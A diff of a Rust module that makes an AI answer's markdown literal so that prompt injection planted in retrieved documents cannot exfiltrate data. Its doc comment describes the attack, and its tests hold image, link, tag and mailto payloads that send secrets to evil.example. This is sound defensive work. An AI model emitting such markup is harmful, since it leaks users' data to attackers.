@@ -1,161 +1,97 @@
 //! The answer as it leaves roll: model output is untrusted, and a planted document can make the
 //! model write markup that a chat UI loads or links (`![.](https://evil.example/p?d=<other
-//! sources>)`, or a reference definition and `![x][a]`), sending text the reader may read to
-//! someone else. So every answer, streamed or whole, native or OpenAI's, goes through
-//! [`Sanitizer`], which breaks that markup wherever it stands, without following CommonMark's
-//! line or container rules (a definition counts inside a block quote or a list item, its label may
-//! span lines or hold `\]`), and without removing anything (the reader still sees the text):
+//! sources>)`, a reference definition, an autolink, a URL a renderer links), sending text the
+//! reader may read to someone else. So every answer, streamed or whole, native or OpenAI's, goes
+//! through [`Sanitizer`], which makes the model's text literal instead of looking for the markup
+//! renderers might find in it (four rounds of review showed renderers reinterpret text in more
+//! ways than patterns can follow: table cells, strikethrough, entities decoded before linking):
 //!
-//! - every `](` becomes `]\(`, so no inline link or image renders, and their URLs code spans; a
-//!   link's label goes through these same rules (a tag or a URL in it is broken too);
-//! - every `]:` becomes `]\:`, so no reference definition (nor footnote) exists, and a reference
-//!   link or image (`[x][a]`, `![x][a]`) has nothing to point at;
-//! - a `<` that starts a tag or an autolink becomes `&lt;`, which no backslash can cancel;
-//! - a bare URL (`http://`, `https://`, `ftp://`, `www.`, and protocol-relative `//host…`), a bare
-//!   email address and a `mailto:` or `xmpp:` one become code spans, which render as text and are
-//!   never linked or fetched; backslashes the model wrote before one become `&#92;`, so none
-//!   escapes the span's backtick;
-//! - every backtick the model writes becomes `&#96;`, so the only code spans are these;
-//! - `\r` and `\r\n` become `\n` first, so every renderer sees the same lines.
+//! - **Markdown's characters as entities.** Every `&`, `\`, `` ` ``, `~`, `|`, `<`, `>`, `[`,
+//!   `]`, `!`, `*`, `_` and `#` the model writes becomes its numeric entity (`&#60;`), which every
+//!   renderer shows as the character and none reads as syntax: no tag, image, link, definition,
+//!   table, code span, emphasis or heading can start, and an entity or escape the model wrote
+//!   (`&#47;`, `\/`) shows as written, never decoded into what it spells.
+//! - **Link-shaped tokens broken.** U+2060 WORD JOINER goes inside every `//`, after a `:` that
+//!   follows a letter (`https:`, `mailto:`), between `www` and its `.`, and before every `@`: no
+//!   GFM, marked, markdown-it or remark autolink spans it, and it's invisible.
+//! - `\r` and `\r\n` become `\n`.
 //!
-//! A profile with `allow_links` keeps inline links (never images) whose URL is exactly one in the
-//! given sources' fields, and a bare such URL only when ASCII whitespace or the answer's end
-//! follows it (GFM's autolinks run on to the next space, through U+00A0 too). While streaming,
-//! text that could still become one of these is held back until it settles: a trailing `]`, `<`
-//! or `\`, a trailing word that is or may become a URL or an address, and an open `[…](…`. At most
-//! [`MAX_HOLD`] bytes are held. Past it they're released by force: the text up to the last
-//! whitespace as above, and the word that was cut, then the rest of that word (up to the next
-//! whitespace, however it arrives), as code spans of their own, so no half can join the other.
+//! Nothing is held back, so an answer streams character by character and every split of it
+//! comes out the same; only with `allow_links` does an open `[` wait (at most [`MAX_HOLD`]
+//! bytes) to see whether it's a link to keep. A kept link is an inline `[label](url)` (never an
+//! image) whose URL is exactly one in the given sources' fields and made only of [`keepable`]
+//! characters, emitted as is (a client comparing URLs finds the source's); its label is literal
+//! like any text. Any other URL, a source's own written out bare included, shows broken.
 //!
-//! What this doesn't do (docs/search/rag.md): kept links carry no `rel` or `referrerpolicy`
-//! (that's the renderer's); code the model writes in a fence is escaped like any text; and a
-//! renderer that links bare domains (markdown-it's fuzzy linkify) can still link `example.com`.
+//! What's left to the renderer (docs/search/rag.md): a kept link carries no `rel` or
+//! `referrerpolicy`; a renderer that links bare domains (markdown-it's fuzzy linkify) can still
+//! link `example.com`; one that decodes entities twice turns the entities back into markup; and
+//! the model's markdown (emphasis, headings, tables, code) shows as its characters.
 
-use regex::Regex;
-use std::sync::OnceLock;
+use std::fmt::Write as _;
 
-/// The most bytes held back.
+/// The most bytes an open `[` holds (`allow_links` only).
 pub const MAX_HOLD: usize = 2048;
 
-/// Breaks links, images, definitions, autolinks, tags and bare URLs in an answer as it streams.
+const WORD_JOINER: char = '\u{2060}';
+
+/// What becomes a numeric entity.
+const LITERAL: [char; 13] = ['&', '\\', '`', '~', '|', '<', '>', '[', ']', '!', '*', '_', '#'];
+
+/// Whether `url` may be a kept link: http(s), at most 2048 bytes, and only characters that can't
+/// end a link destination, split a table cell or start markup (RFC 3986's unreserved and
+/// reserved characters but `(`, `)`, `[`, `]`, `'` and `|`, and `%`).
+pub fn keepable(url: &str) -> bool {
+    let rest = url.strip_prefix("https://").or_else(|| url.strip_prefix("http://"));
+    rest.is_some_and(|r| !r.is_empty() && url.len() <= 2048 && r.bytes().all(|b| b.is_ascii_alphanumeric() || b"-._~:/?#@!$&*+,;=%".contains(&b)))
+}
+
+/// Makes an answer's text literal as it streams.
 pub struct Sanitizer {
-    held: String,
-    /// URLs a link may keep (`allow_links`: the sources' own); `None`: no links at all.
+    /// URLs a link may keep (`allow_links`: the sources' own, [`keepable`] ones); `None`: none.
     allowed: Option<Vec<String>>,
     /// The last text fed ended with `\r`: a `\n` starting the next is the same line ending.
     after_cr: bool,
-    /// A forced release cut a word: what follows, up to whitespace, is the rest of it, released
-    /// as a code span of its own (`lead` holds it until then).
-    continuing: bool,
-    lead: String,
+    /// The model's last three characters, newest last.
+    prev: [char; 3],
+    /// An open `[` and what followed it (`allow_links` only).
+    held: String,
 }
 
-fn markup() -> &'static Regex {
-    static R: OnceLock<Regex> = OnceLock::new();
-    R.get_or_init(|| {
-        Regex::new(concat!(
-            r"(?P<link>(?P<bang>!)?\[(?P<text>[^\[\]\n]*)\]\((?P<url>[^()\s]*)\))",
-            r"|(?P<close>\]\()",
-            r"|(?P<defn>\]:)",
-            r"|(?P<auto><(?P<aurl>(?i:https?://|ftp://|www\.|//)[^\s<>`]*)(?P<gt>>)?)",
-            r"|(?P<tag><[A-Za-z/!?])",
-            r"|(?P<tick>`)",
-            r"|(?P<pre>\\*)(?:",
-            r"(?P<bare>(?i:https?://|ftp://|www\.)[^\s<>`)\]]+|//[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+[^\s<>`)\]]*)",
-            r"|(?P<mail>(?i:mailto:|xmpp:)[^\s<>`]*|[A-Za-z0-9.+_-]+@[A-Za-z0-9_-]+(?:\.[A-Za-z0-9_-]+)+))",
-        ))
-        .expect("the markup pattern")
-    })
+/// What an open `[…` is so far.
+enum Open {
+    More,
+    No,
+    /// A whole `[label](url)`: the byte ranges of its label and URL in what's held.
+    Link { label: std::ops::Range<usize>, url: std::ops::Range<usize> },
 }
 
-/// A whole inline link or image, as [`markup`]'s `link` reads it.
-fn links() -> &'static Regex {
-    static R: OnceLock<Regex> = OnceLock::new();
-    R.get_or_init(|| Regex::new(r"!?\[[^\[\]\n]*\]\([^()\s]*\)").expect("the link pattern"))
-}
-
-/// `s` as a code span (backticks inside it dropped).
-fn code(s: &str) -> String {
-    let s: String = s.chars().filter(|c| *c != '`').collect();
-    if s.is_empty() { String::new() } else { format!("`{s}`") }
-}
-
-/// Whether a trailing word is, or may still become, a URL or an address.
-fn url_ahead(word: &str) -> bool {
-    let w = word.trim_start_matches(|c: char| "([{<\"'*_~".contains(c)).to_ascii_lowercase();
-    if w.is_empty() {
-        return false;
+fn open_link(h: &str) -> Open {
+    let Some(label_end) = h[1..].find(|c| c == ']' || c == '[' || c == '\n').map(|i| i + 1) else {
+        return if h.len() - 1 > 512 { Open::No } else { Open::More };
+    };
+    if h.as_bytes()[label_end] != b']' || label_end - 1 > 512 {
+        return Open::No;
     }
-    // `//host` may follow anything (`src=//evil…`): a word holding `//`, or ending in `/`, waits.
-    // A scheme may start after any punctuation (`\https:`, `src=https:`): its tail counts too.
-    let tail = w.rsplit(|c: char| !(c.is_ascii_alphanumeric() || ":/.".contains(c))).next().unwrap_or_default();
-    w.contains("//")
-        || w.ends_with('/')
-        || w.contains('@')
-        || [w.as_str(), tail].iter().any(|w| {
-            ["www.", "mailto:", "xmpp:"].iter().any(|p| w.starts_with(p))
-                || (!w.is_empty() && ["https://", "http://", "ftp://", "www.", "mailto:", "xmpp:"].iter().any(|p| p.starts_with(w)))
-        })
-}
-
-/// Where the last word of `s` starts (after its last whitespace).
-fn last_word(s: &str) -> usize {
-    s.char_indices().rev().find(|(_, c)| c.is_whitespace()).map_or(0, |(i, c)| i + c.len_utf8())
-}
-
-/// `text` with its markup broken. `allowed`: the URLs links may keep (`None` inside a label: a
-/// URL there is never kept). `at_end`: nothing follows `text` (a bare URL at its end may stay).
-fn escape(text: &str, allowed: Option<&[String]>, at_end: bool) -> String {
-    let is_allowed = |u: &str| allowed.is_some_and(|a| a.iter().any(|x| x == u));
-    markup()
-        .replace_all(text, |c: &regex::Captures| {
-            if c.name("link").is_some() {
-                let url = c.name("url").map_or("", |m| m.as_str());
-                // The label is model text like any other: a tag or a URL in it is broken too.
-                let label = escape(c.name("text").map_or("", |m| m.as_str()), None, false);
-                if c.name("bang").is_none() && is_allowed(url) {
-                    return format!("[{label}]({url})");
-                }
-                let bang = if c.name("bang").is_some() { "!" } else { "" };
-                return format!("{bang}[{label}]\\({})", code(url));
-            }
-            if c.name("close").is_some() {
-                return "]\\(".to_string();
-            }
-            if c.name("defn").is_some() {
-                return "]\\:".to_string();
-            }
-            if let Some(u) = c.name("aurl") {
-                let gt = if c.name("gt").is_some() { ">" } else { "" };
-                return format!("&lt;{}{gt}", code(u.as_str()));
-            }
-            if let Some(t) = c.name("tag") {
-                return format!("&lt;{}", &t.as_str()[1..]);
-            }
-            if c.name("tick").is_some() {
-                return "&#96;".to_string();
-            }
-            // A backslash before the span would escape its backtick.
-            let pre = "&#92;".repeat(c.name("pre").map_or(0, |m| m.len()));
-            if let Some(m) = c.name("mail") {
-                return format!("{pre}{}", code(m.as_str()));
-            }
-            let m = c.name("bare").expect("the last alternative");
-            // A kept URL ends at ASCII whitespace or the answer's end: anything else (U+00A0
-            // too) would extend GFM's autolink past it.
-            let next = text[m.end()..].chars().next();
-            let ends = next.is_some_and(|c| c.is_ascii_whitespace()) || (next.is_none() && at_end);
-            if ends && is_allowed(m.as_str()) {
-                return format!("{pre}{}", m.as_str());
-            }
-            format!("{pre}{}", code(m.as_str()))
-        })
-        .into_owned()
+    let after = label_end + 1;
+    match h.as_bytes().get(after) {
+        None => return Open::More,
+        Some(b'(') => {}
+        Some(_) => return Open::No,
+    }
+    let start = after + 1;
+    match h[start..].find(|c: char| c == ')' || c == '(' || c.is_whitespace()) {
+        None if h.len() - start > 2048 => Open::No,
+        None => Open::More,
+        Some(i) if h.as_bytes()[start + i] == b')' => Open::Link { label: 1..label_end, url: start..start + i },
+        Some(_) => Open::No,
+    }
 }
 
 impl Sanitizer {
     pub fn new(allowed: Option<Vec<String>>) -> Sanitizer {
-        Sanitizer { held: String::new(), allowed, after_cr: false, continuing: false, lead: String::new() }
+        let allowed = allowed.map(|a| a.into_iter().filter(|u| keepable(u)).collect());
+        Sanitizer { allowed, after_cr: false, prev: ['\0'; 3], held: String::new() }
     }
 
     /// `text` with `\r\n` and `\r` as `\n` (a `\r\n` split across two pieces too).
@@ -181,86 +117,86 @@ impl Sanitizer {
         out
     }
 
-    /// Takes `text` and answers what can be released now.
-    pub fn feed(&mut self, text: &str) -> String {
-        let mut text = self.lines(text);
-        let mut out = String::new();
-        if self.continuing {
-            let end = text.find(char::is_whitespace).unwrap_or(text.len());
-            self.lead.push_str(&text[..end]);
-            let rest = text.split_off(end);
-            if rest.is_empty() {
-                // Still in the word: held, within the bound.
-                if self.lead.len() > MAX_HOLD {
-                    out.push_str(&code(&std::mem::take(&mut self.lead)));
+    /// One character the model wrote, as literal text.
+    fn literal(&mut self, c: char, out: &mut String) {
+        let [p3, p2, p1] = self.prev;
+        if LITERAL.contains(&c) {
+            let _ = write!(out, "&#{};", c as u32);
+        } else if c == '/' && p1 == '/' {
+            out.push(WORD_JOINER);
+            out.push('/');
+        } else if c == '.' && p3.eq_ignore_ascii_case(&'w') && p2.eq_ignore_ascii_case(&'w') && p1.eq_ignore_ascii_case(&'w') {
+            out.push(WORD_JOINER);
+            out.push('.');
+        } else if c == ':' && p1.is_ascii_alphabetic() {
+            out.push(':');
+            out.push(WORD_JOINER);
+        } else if c == '@' {
+            out.push(WORD_JOINER);
+            out.push('@');
+        } else {
+            out.push(c);
+        }
+        self.prev = [p2, p1, c];
+    }
+
+    fn step(&mut self, c: char, out: &mut String) {
+        if !self.held.is_empty() {
+            self.held.push(c);
+            self.settle(false, out);
+        } else if c == '[' && self.allowed.is_some() {
+            self.held.push(c);
+        } else {
+            self.literal(c, out);
+        }
+    }
+
+    /// Decides what's held once it can be (`end`: nothing more comes).
+    fn settle(&mut self, end: bool, out: &mut String) {
+        let held = std::mem::take(&mut self.held);
+        match open_link(&held) {
+            Open::More if !end && held.len() <= MAX_HOLD => self.held = held,
+            // Not after `!`: an image is never kept.
+            Open::Link { label, url } if self.prev[2] != '!' && self.allowed.as_ref().is_some_and(|a| a.iter().any(|u| *u == held[url.clone()])) => {
+                out.push('[');
+                for c in held[label].chars() {
+                    self.literal(c, out);
                 }
-                return out;
+                out.push_str("](");
+                out.push_str(&held[url]);
+                out.push(')');
+                self.prev = [self.prev[1], self.prev[2], ')'];
             }
-            out.push_str(&code(&std::mem::take(&mut self.lead)));
-            self.continuing = false;
-            text = rest;
-        }
-        self.held.push_str(&text);
-        let cut = self.hold_from();
-        if self.held.len() - cut > MAX_HOLD {
-            // Released by force: up to the last whitespace as usual, then the word that was cut,
-            // whatever it holds, as a code span (and the rest of it after, `continuing`).
-            let word = self.held.split_off(last_word(&self.held));
-            let head = std::mem::take(&mut self.held);
-            out.push_str(&escape(&head, self.allowed.as_deref(), false));
-            if !word.is_empty() {
-                out.push_str(&code(&word));
-                self.continuing = true;
+            // Not a link to keep: the `[` as text, and what followed it again.
+            _ => {
+                self.literal('[', out);
+                for c in held[1..].chars() {
+                    self.step(c, out);
+                }
+                if end && !self.held.is_empty() {
+                    self.settle(true, out);
+                }
             }
-            return out;
         }
-        let ready: String = self.held.drain(..cut).collect();
-        out.push_str(&escape(&ready, self.allowed.as_deref(), false));
+    }
+
+    /// Takes `text` and answers it, literal.
+    pub fn feed(&mut self, text: &str) -> String {
+        let text = self.lines(text);
+        let mut out = String::with_capacity(text.len() + text.len() / 4);
+        for c in text.chars() {
+            self.step(c, &mut out);
+        }
         out
     }
 
     /// Releases what's held (the answer ended: nothing can complete it).
     pub fn finish(&mut self) -> String {
-        let mut out = code(&std::mem::take(&mut self.lead));
-        self.continuing = false;
-        let held = std::mem::take(&mut self.held);
-        out.push_str(&escape(&held, self.allowed.as_deref(), true));
+        let mut out = String::new();
+        if !self.held.is_empty() {
+            self.settle(true, &mut out);
+        }
         out
-    }
-
-    /// Where the held text must start: the earliest point after which it may still change.
-    fn hold_from(&self) -> usize {
-        let b = &self.held;
-        let mut cut = b.len();
-        let ws = last_word(b);
-        if url_ahead(&b[ws..]) {
-            cut = cut.min(ws);
-        }
-        // Letters an address's local part may hold: `help` may still become `help@evil.example`.
-        let local = b.len() - b.trim_end_matches(|c: char| c.is_ascii_alphanumeric() || ".+_-".contains(c)).len();
-        cut = cut.min(b.len() - local);
-        // An open `[…`, `[…]` (a `(` may follow) or `[…](…`: released whole, as one link.
-        if let Some(p) = b.rfind('[') {
-            let rest = &b[p..];
-            let open = match rest.find("](") {
-                None => !rest.contains(']') || rest.ends_with(']'),
-                Some(i) => !rest[i..].contains(')'),
-            };
-            if open {
-                cut = cut.min(p);
-            }
-        }
-        // Never inside a whole link (a URL word in its label): it goes out as one.
-        if let Some(m) = links().find_iter(b.as_str()).find(|m| m.start() < cut && cut < m.end()) {
-            cut = m.start();
-        }
-        // What stands right before the held text (or ends the answer so far) may join what
-        // follows, so it waits with it: `<` a tag, `]` a link or a definition, `!` an image, and
-        // backslashes, whose count decides what's escaped.
-        while cut > 0 && matches!(b.as_bytes()[cut - 1], b'<' | b']' | b'!' | b'\\') {
-            cut -= 1;
-        }
-        cut
     }
 }
 
@@ -277,10 +213,10 @@ mod tests {
     use super::*;
     use comrak::nodes::NodeValue;
 
-    /// `out` rendered as GitHub-flavored markdown (extended autolinks, footnotes, tables) holds no
-    /// image, no HTML, no link but to `allowed`, and no text a renderer could link (a URL, a
-    /// protocol-relative `//host`).
-    fn inert(out: &str, allowed: &[&str]) {
+    /// `out` rendered as GitHub-flavored markdown (extended autolinks, footnotes, tables,
+    /// strikethrough) holds no image, no HTML, no link but to `allowed`, and no text a renderer
+    /// could link (a URL, an address, `www.`, a protocol-relative `//host`).
+    fn inert(out: &str, allowed: &[String]) {
         let mut o = comrak::Options::default();
         o.extension.autolink = true;
         o.extension.footnotes = true;
@@ -289,93 +225,127 @@ mod tests {
         o.extension.tasklist = true;
         let arena = comrak::Arena::new();
         let root = comrak::parse_document(&arena, out, &o);
-        let bare = Regex::new(r"(?i)https?://|ftp://|www\.|//[a-z0-9-]+\.[a-z]").unwrap();
+        let linkable = regex::Regex::new(r"(?i)https?://|ftp://|www\.|//[a-z0-9-]|mailto:|xmpp:|[a-z0-9.+_-]@[a-z0-9]").unwrap();
         for n in root.descendants() {
             match &n.data().value {
-                NodeValue::Link(l) => assert!(allowed.contains(&l.url.as_str()), "a link to {} in {out:?}", l.url),
+                NodeValue::Link(l) => assert!(allowed.contains(&l.url), "a link to {} in {out:?}", l.url),
                 NodeValue::Image(l) => panic!("an image of {} in {out:?}", l.url),
                 NodeValue::HtmlInline(h) => panic!("inline HTML {h:?} in {out:?}"),
                 NodeValue::HtmlBlock(h) => panic!("an HTML block {:?} in {out:?}", h.literal),
-                NodeValue::Text(t) => assert!(!bare.is_match(t) || allowed.iter().any(|a| t.contains(a)), "linkable text {t:?} in {out:?}"),
+                NodeValue::FootnoteReference(_) | NodeValue::FootnoteDefinition(_) => panic!("a footnote in {out:?}"),
+                NodeValue::Table(_) => panic!("a table in {out:?}"),
+                NodeValue::Text(t) if n.parent().is_none_or(|p| !matches!(p.data().value, NodeValue::Link(_))) => assert!(!linkable.is_match(t), "linkable text {t:?} in {out:?}"),
                 _ => {}
             }
         }
     }
 
-    #[test]
-    fn planted_images_and_links_are_broken_however_the_stream_splits_them() {
-        let answer = concat!(
-            "Reset it in Settings [1].\n![.](https://evil.example/p?d=secret) and [click](https://evil.example/q) <https://evil.example/a> <img src=x>\n",
-            "[r]: https://evil.example/r\nsee https://evil.example/b [2]\n\n",
-            // A definition in a block quote and in a list item, used by images below.
-            "> [a]: //evil.example/p?d=1\n\n![x][a]\n\n- [b]: //evil.example/q\n\n![y][b]\n\n",
-            // A label over two lines, and one holding an escaped bracket.
-            "[\nfoo\n]: //evil.example/f\n\n![x][foo]\n\n[a\\]b]: //evil.example/e\n\n![x][a\\]b]\n\n",
-            // Bare carriage returns as line endings.
-            "ok\r[c]: //evil.example/r\r\r![x][c]\r\r",
-            // A backslash the model wrote before a tag.
-            "\\<img src=//evil.example/i>\n",
-            // Markup in a link's label: a tag, an autolink, bare URLs.
-            "[<img src=\"https://evil.example/i/SECRET\" alt=x>](1) [<svg><image href=//evil.example/s>](2)\n",
-            "[<https://evil.example/a> https://evil.example/b www.evil.example](3)\n",
-            // Backticks the model writes, and backslashes before a URL.
-            "a `b https://evil.example/p?d=SECRET c` and `` x `` \\https://evil.example/s \\\\https://evil.example/t\n",
-            // Addresses.
-            "mail help@evil.example, mailto:x@evil.example?body=SECRET or xmpp:x@evil.example/r\n",
-        );
-        let whole = sanitize(answer, None);
-        inert(&whole, &[]);
-        assert!(whole.starts_with("Reset it in Settings [1].\n![.]\\(`https://evil.example/p?d=secret`) and [click]\\(`https://evil.example/q`) &lt;`https://evil.example/a`> &lt;img src=x>\n[r]\\: `https://evil.example/r`"), "{whole}");
-        assert!(whole.contains("[&lt;img src=\"`https://evil.example/i/SECRET\"` alt=x>]\\(`1`)"), "{whole}");
-        assert!(whole.contains("a &#96;b `https://evil.example/p?d=SECRET` c&#96;"), "{whole}");
-        // However the stream splits it, the same answer.
-        for at in 1..answer.len() {
-            if !answer.is_char_boundary(at) {
-                continue;
-            }
-            let mut s = Sanitizer::new(None);
-            let mut out = s.feed(&answer[..at]);
-            out.push_str(&s.feed(&answer[at..]));
-            out.push_str(&s.finish());
-            assert_eq!(out, whole, "split at {at}");
-        }
-        // allow_links keeps a link to a source's own URL (its label escaped like any text), never
-        // an image, and a bare one only when ASCII whitespace or the end follows it.
-        let ok = vec!["https://help.acme.test/pw".to_string()];
-        let out = sanitize(
-            "[Reset](https://help.acme.test/pw) ![x](https://help.acme.test/pw) [y](https://evil.example) https://help.acme.test/pw)d=secret [<img src=https://evil.example/i>](https://help.acme.test/pw) [https://help.acme.test/pw](https://help.acme.test/pw) https://help.acme.test/pw\u{a0}x https://help.acme.test/pw",
-            Some(ok),
-        );
-        assert_eq!(
-            out,
-            "[Reset](https://help.acme.test/pw) ![x]\\(`https://help.acme.test/pw`) [y]\\(`https://evil.example`) `https://help.acme.test/pw`)d=secret [&lt;img src=`https://evil.example/i`>](https://help.acme.test/pw) [`https://help.acme.test/pw`](https://help.acme.test/pw) `https://help.acme.test/pw`\u{a0}x https://help.acme.test/pw"
-        );
-        inert(&out, &["https://help.acme.test/pw"]);
+    /// Every payload of the reviews (`tests/fixtures/chat-markup.json`): `force` ones behind an
+    /// open `[` past the bound, `allowed` ones with links allowed to those URLs.
+    fn corpus() -> Vec<(String, String, Option<Vec<String>>)> {
+        let v: serde_json::Value = serde_json::from_str(include_str!("../../../tests/fixtures/chat-markup.json")).unwrap();
+        v.as_array()
+            .unwrap()
+            .iter()
+            .map(|it| {
+                let mut text = it["text"].as_str().unwrap().to_string();
+                if it["force"] == true {
+                    text = format!("[{}{text}", "w ".repeat(MAX_HOLD / 2 + 4));
+                }
+                let allowed = it.get("allowed").and_then(|a| a.as_array()).map(|a| a.iter().map(|u| u.as_str().unwrap().to_string()).collect());
+                (it["name"].as_str().unwrap().to_string(), text, allowed)
+            })
+            .collect()
+    }
+
+    fn run(chunks: &[&str], allowed: &Option<Vec<String>>) -> String {
+        let mut s = Sanitizer::new(allowed.clone());
+        let mut out: String = chunks.iter().map(|c| s.feed(c)).collect();
+        out.push_str(&s.finish());
+        out
+    }
+
+    fn kept(allowed: &Option<Vec<String>>) -> Vec<String> {
+        allowed.iter().flatten().filter(|u| keepable(u)).cloned().collect()
     }
 
     #[test]
-    fn holding_back_is_bounded() {
-        let mut s = Sanitizer::new(None);
-        let out = s.feed(&format!("https://evil.example/{}", "a".repeat(MAX_HOLD + 10)));
-        assert!(out.starts_with("`https://evil.example/") && out.ends_with('`'), "{}", &out[..40]);
+    fn every_reviewed_payload_is_literal_however_the_stream_splits_it() {
+        for (name, text, allowed) in corpus() {
+            let whole = sanitize(&text, allowed.clone());
+            inert(&whole, &kept(&allowed));
+            let chars: Vec<String> = text.chars().map(String::from).collect();
+            assert_eq!(run(&chars.iter().map(String::as_str).collect::<Vec<_>>(), &allowed), whole, "[{name}] one character at a time");
+            for (at, _) in text.char_indices().skip(1) {
+                assert_eq!(run(&[&text[..at], &text[at..]], &allowed), whole, "[{name}] split at {at}");
+            }
+        }
+    }
+
+    #[test]
+    fn literal_text_and_kept_links() {
+        assert_eq!(sanitize("![x](https://e/p) <img> a|b ~c~ *d* `e` #f &amp; \\[", None), "&#33;&#91;x&#93;(https:\u{2060}/\u{2060}/e/p) &#60;img&#62; a&#124;b &#126;c&#126; &#42;d&#42; &#96;e&#96; &#35;f &#38;amp; &#92;&#91;");
+        assert_eq!(sanitize("www.e.com help@e.com mailto:x ftp://e 10:30", None), "www\u{2060}.e.com help\u{2060}@e.com mailto:\u{2060}x ftp:\u{2060}/\u{2060}/e 10:30");
+        let ok = Some(vec!["https://help.acme.test/pw".to_string(), "https://help.acme.test/(x)".to_string()]);
+        assert_eq!(
+            sanitize("[Reset *now*](https://help.acme.test/pw) ![i](https://help.acme.test/pw) [y](https://evil.example) [z](https://help.acme.test/(x)) https://help.acme.test/pw", ok),
+            "[Reset &#42;now&#42;](https://help.acme.test/pw) &#33;&#91;i&#93;(https:\u{2060}/\u{2060}/help.acme.test/pw) &#91;y&#93;(https:\u{2060}/\u{2060}/evil.example) &#91;z&#93;(https:\u{2060}/\u{2060}/help.acme.test/(x)) https:\u{2060}/\u{2060}/help.acme.test/pw"
+        );
+        assert!(!keepable("https://evil.example/|<style>") && !keepable("javascript:alert(1)") && keepable("https://help.acme.test/a?b=1&c=%20#d"));
+        // An open `[` is bounded.
+        let mut s = Sanitizer::new(Some(vec!["https://a.test/".into()]));
+        let out = s.feed(&format!("[{}", "w ".repeat(MAX_HOLD)));
+        assert!(out.starts_with("&#91;w w"), "{}", &out[..20]);
         assert_eq!(s.finish(), "");
-        // A forced release can't cut a URL into halves that join again: an open `[` holds the
-        // answer past the bound, and the stream cuts it anywhere, `https:/` included.
-        let answer = format!("x [{}](https://evil.example/i) y [{}]\\\\(https://evil.example/j) z", "word ".repeat(MAX_HOLD / 5 + 2), "w".repeat(MAX_HOLD + 3));
-        for at in 1..answer.len() {
-            let mut s = Sanitizer::new(None);
-            let mut out = s.feed(&answer[..at]);
-            out.push_str(&s.feed(&answer[at..]));
-            out.push_str(&s.finish());
-            inert(&out, &[]);
+    }
+
+    /// The reviewer's random compositions of dangerous fragments (round 4), each whole and in
+    /// random pieces: the same answer, and inert.
+    #[test]
+    fn random_compositions_are_literal() {
+        const P: &[&str] = &[
+            "[", "]", "(", ")", "!", "<", ">", "`", "*", "_", ":", "/", "//", "https:", "http://", "https://", "www.", "evil.example", "x", "ab", "@", "mailto:", " ", "\n", "img src=x", "a", "1", ".", "\"", "中", "é", "-",
+            "?d=S", "]:", "<a href=x>", "\t", "#", "=", ";", "{", "}", "^", "$", "%", "+", ",", "'", "\r", "&#47;", "&#58;", "|", "~", "\\", "&", "&amp;", "\u{2060}", "[ok](https://help.acme.test/pw)", "https://help.acme.test/pw", "| h |\n|---|\n| ",
+        ];
+        let mut seed: u64 = 1;
+        let mut rnd = |n: usize| {
+            seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
+            ((seed >> 33) as usize) % n
+        };
+        for i in 0..4000 {
+            let allowed = (i % 2 == 0).then(|| vec!["https://help.acme.test/pw".to_string()]);
+            let k = 3 + rnd(14);
+            let text: String = (0..k).map(|_| P[rnd(P.len())]).collect();
+            let whole = sanitize(&text, allowed.clone());
+            inert(&whole, &kept(&allowed));
+            let chars: Vec<char> = text.chars().collect();
+            let mut pieces = Vec::new();
+            let mut at = 0;
+            while at < chars.len() {
+                let to = (at + 1 + rnd(4)).min(chars.len());
+                pieces.push(chars[at..to].iter().collect::<String>());
+                at = to;
+            }
+            assert_eq!(run(&pieces.iter().map(String::as_str).collect::<Vec<_>>(), &allowed), whole, "{text:?} in {pieces:?}");
         }
-        // One byte at a time.
-        let mut s = Sanitizer::new(None);
-        let mut out = String::new();
-        for c in answer.chars() {
-            out.push_str(&s.feed(&c.to_string()));
-        }
-        out.push_str(&s.finish());
-        inert(&out, &[]);
+    }
+
+    /// Sanitizes a file of inputs for the gate's renderer check (marked, markdown-it, remark):
+    /// `ROLL_SANITIZE_IN` holds `[{chunks: [..], allowed?: [..]}]`, `ROLL_SANITIZE_OUT` gets the
+    /// outputs in order. Not run by `cargo test`.
+    #[test]
+    #[ignore]
+    fn sanitize_inputs_for_renderers() {
+        let Ok(input) = std::env::var("ROLL_SANITIZE_IN") else { return };
+        let items: Vec<serde_json::Value> = serde_json::from_str(&std::fs::read_to_string(input).unwrap()).unwrap();
+        let outs: Vec<String> = items
+            .iter()
+            .map(|it| {
+                let chunks: Vec<&str> = it["chunks"].as_array().unwrap().iter().map(|c| c.as_str().unwrap()).collect();
+                let allowed = it.get("allowed").and_then(|a| a.as_array()).map(|a| a.iter().map(|u| u.as_str().unwrap().to_string()).collect());
+                run(&chunks, &allowed)
+            })
+            .collect();
+        std::fs::write(std::env::var("ROLL_SANITIZE_OUT").unwrap(), serde_json::to_string(&outs).unwrap()).unwrap();
     }
 }
